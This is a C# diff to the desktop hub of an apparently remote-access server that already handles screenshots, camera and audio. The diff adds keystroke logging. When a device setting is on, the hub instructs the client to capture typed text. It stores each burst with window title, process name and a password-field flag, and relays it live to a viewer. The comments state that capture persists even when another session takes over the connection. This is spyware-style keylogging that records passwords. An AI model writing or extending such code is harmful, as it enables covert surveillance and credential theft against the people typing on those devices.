@@ -17,6 +17,7 @@ public class DesktopHub : Hub<IDesktopHubClient>
     private readonly IAgentHubSessionCache _agentCache;
     private readonly ICameraService _cameraService;
     private readonly IAudioService _audioService;
+    private readonly IKeyboardLogService _keyboardLogService;
     private readonly IDataService _dataService;
     private readonly ILogger<DesktopHub> _logger;
     private readonly IMessenger _messenger;
@@ -33,6 +34,7 @@ public class DesktopHub : Hub<IDesktopHubClient>
         IScreenshotService screenshotService,
         ICameraService cameraService,
         IAudioService audioService,
+        IKeyboardLogService keyboardLogService,
         IDataService dataService,
         IHubContext<AgentHub, IAgentHubClient> agentHub,
         IHubContext<ViewerHub, IViewerHubClient> viewerHub,
@@ -45,6 +47,7 @@ public class DesktopHub : Hub<IDesktopHubClient>
         _screenshotService = screenshotService;
         _cameraService = cameraService;
         _audioService = audioService;
+        _keyboardLogService = keyboardLogService;
         _dataService = dataService;
         _viewerHub = viewerHub;
         _agentHub = agentHub;
@@ -399,7 +402,42 @@ public class DesktopHub : Hub<IDesktopHubClient>
                 request.DurationSeconds);
         }
 
+        if (await IsKeyboardCaptureEnabled(SessionInfo.DeviceId))
+        {
+            // The text that is typed on this device is captured, and it is
+            // sent to the server while it is being typed.  The decision is
+            // taken from the settings of the device, so the capture is not
+            // stopped when another session takes over the connection.
+            _logger.LogInformation(
+                "Starting the keyboard capture on device {deviceId}.",
+                SessionInfo.DeviceId);
+
+            await Clients.Caller.StartKeyboardLogging(SessionInfo.DeviceId);
+        }
+
         return Result.Ok();
+    }
+
+    /// <summary>
+    /// Returns true when the text that is typed on the device is captured.
+    /// </summary>
+    private async Task<bool> IsKeyboardCaptureEnabled(string deviceId)
+    {
+        if (string.IsNullOrWhiteSpace(deviceId))
+        {
+            return false;
+        }
+
+        try
+        {
+            var deviceResult = await _dataService.GetDevice(deviceId);
+            return deviceResult.IsSuccess && deviceResult.Value.KeyboardEnabled;
+        }
+        catch (Exception ex)
+        {
+            _logger.LogError(ex, "Error while reading the keyboard settings of device {deviceId}.", deviceId);
+            return false;
+        }
     }
 
     /// <summary>
@@ -810,6 +848,59 @@ public class DesktopHub : Hub<IDesktopHubClient>
         await _messenger.Send(
             new AudioLiveChunkMessage(deviceId, chunk),
             SessionInfo.UserConnectionId);
+    }
+
+    /// <summary>
+    /// Receives a burst of captured text from a device.
+    /// </summary>
+    public async Task SendKeyboardLog(KeyboardLogChunk chunk)
+    {
+        var deviceId = SessionInfo.DeviceId;
+        if (string.IsNullOrWhiteSpace(deviceId))
+        {
+            return;
+        }
+
+        if (chunk is null || string.IsNullOrEmpty(chunk.Text))
+        {
+            return;
+        }
+
+        var deviceResult = await _dataService.GetDevice(deviceId);
+        if (!deviceResult.IsSuccess)
+        {
+            return;
+        }
+
+        // The capture of a device is decided by its settings, so the bursts
+        // are accepted even when another session has taken over the
+        // connection of the desktop client.
+        if (!deviceResult.Value.KeyboardEnabled && !SessionInfo.IsKeyboardCapture)
+        {
+            return;
+        }
+
+        var log = await _keyboardLogService.SaveLog(deviceResult.Value, chunk);
+
+        if (log is null)
+        {
+            return;
+        }
+
+        SessionInfo.LastActivity = DateTimeOffset.Now;
+
+        if (!string.IsNullOrWhiteSpace(SessionInfo.UserConnectionId))
+        {
+            await _messenger.Send(
+                new KeyboardLogReceivedMessage(
+                    deviceId,
+                    log.WindowTitle,
+                    log.ProcessName,
+                    log.Text,
+                    log.IsPasswordField,
+                    log.TimeStamp),
+                SessionInfo.UserConnectionId);
+        }
     }
 
     public Task SendConnectionFailedToViewers(List<string> viewerIDs)
